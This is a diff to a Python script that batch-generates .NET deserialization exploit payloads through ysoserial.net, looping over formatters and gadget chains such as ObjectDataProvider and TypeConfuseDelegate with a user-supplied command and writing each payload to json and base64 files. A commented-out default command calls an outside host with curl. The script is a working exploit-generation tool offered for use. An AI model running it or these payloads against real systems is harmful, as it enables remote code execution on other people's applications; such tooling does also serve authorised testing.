@@ -1,3 +1,4 @@
+
 import subprocess
 import os
 import sys
@@ -21,7 +22,7 @@ def gen_ysoserial_payloads(cmd, exe_path):
             "ToolboxItemContainer",
             "TypeConfuseDelegate",
             "WindowsClaimsIdentity",
-            "WindowsIdentity"
+            "WindowsIdentity" 
             ],
         "Json.Net":[
             "ObjectDataProvider",
@@ -30,7 +31,7 @@ def gen_ysoserial_payloads(cmd, exe_path):
             "WindowsIdentity",
             "WindowsClaimsIdentity",
             "SessionViewStateHistoryItem",
-            "SessionSecurityToken"
+            "SessionSecurityToken"    
         ],
         "SoapFormatter":[
             "ActivitySurrogateDisableTypeCheck",
@@ -50,7 +51,7 @@ def gen_ysoserial_payloads(cmd, exe_path):
             "WindowsClaimsIdentity",
             "WindowsIdentity",
             "WindowsPrincipal"
-
+            
         ],
         "JavaScriptSerializer":[
             "ObjectDataProvider"
@@ -58,45 +59,52 @@ def gen_ysoserial_payloads(cmd, exe_path):
         "XmlSerializer":[
             "ObjectDataProvider"
         ]
-
+        
     }
     payloads = []
     for formatter in gadgets.keys():
         for g in gadgets[formatter]:
-            if g != "":
-                #g = g.replace(" ","")
-                print("  [ * ]  Generating Payload for Gadget: ", g)
-                try:
-                    payload = subprocess.run([exe_path, "--formatter", formatter,"-g", g, "-c", cmd, "-o", "base64"],
-                                                stdout=subprocess.PIPE,
-                                                stderr=subprocess.DEVNULL
-                                            ).stdout
-
-                    p = {"formatter":formatter, "gadget":g, "payload":payload } # Casting and removing b'' format from payload
-
-                    payloads.append(p)
-                except:
-                    print('some kind of error')
-
-
+            for style in ["json", "base64"]: 
+                if g != "":
+                    #g = g.replace(" ","")
+                    print("  [ * ]  Generating Payload for Gadget: ", g)
+                    #try:
+                    if True:
+                        payload = subprocess.run([exe_path, "--formatter", formatter,"-g", g, "-c", cmd, "-o", style], 
+                                                    stdout=subprocess.PIPE,
+                                                    stderr=subprocess.DEVNULL
+                                                ).stdout
+                        
+                        p = {"formatter":formatter, "gadget":g, "output":style, "payload":payload } # Casting and removing b'' format from payload
+                        
+                        payloads.append(p)
+                    #except:
+                    #    print('some kind of error')
+        
+        
     if "payloads" not in os.listdir():
         os.mkdir("payloads")
 
     for f in gadgets.keys():
         if f not in os.listdir("payloads"):
             os.mkdir("payloads\\"+f)
-
+        if "json" not in os.listdir("payloads\\"+f):
+            os.mkdir("payloads\\"+f+"\\json")
+        if "base64" not in os.listdir("payloads\\"+f):
+            os.mkdir("payloads\\"+f+"\\base64")    
+    
+    # Save payloads to files
     for p in payloads:
-        fname = "payloads\\" + p["formatter"] + "\\" + p["gadget"]
-        print("\n\n",p["gadget"],"\n",p['payload'])
+        fname = "payloads\\" + p["formatter"] + "\\"+ p["output"]+ "\\" + p["gadget"]
+        #print("\n\n",p["gadget"],"\n",p['payload'])
         with open(fname, "w+") as writer:
             writer.write(str(p["payload"])[2:-1]) # Cast and Remove b'' format from payload
-
+            
 if __name__ == "__main__":
-
+    
     if len(sys.argv) < 2:
         print("Usage: python3",sys.argv[0],"[cmd]  [exe-path]")
-
+        
     #cmd="curl http://10.83.152.172:8000"
     #exe_path=".\\ysoserial.net\\ysoserial\\bin\\Debug\\ysoserial.exe"
     cmd = sys.argv[1]
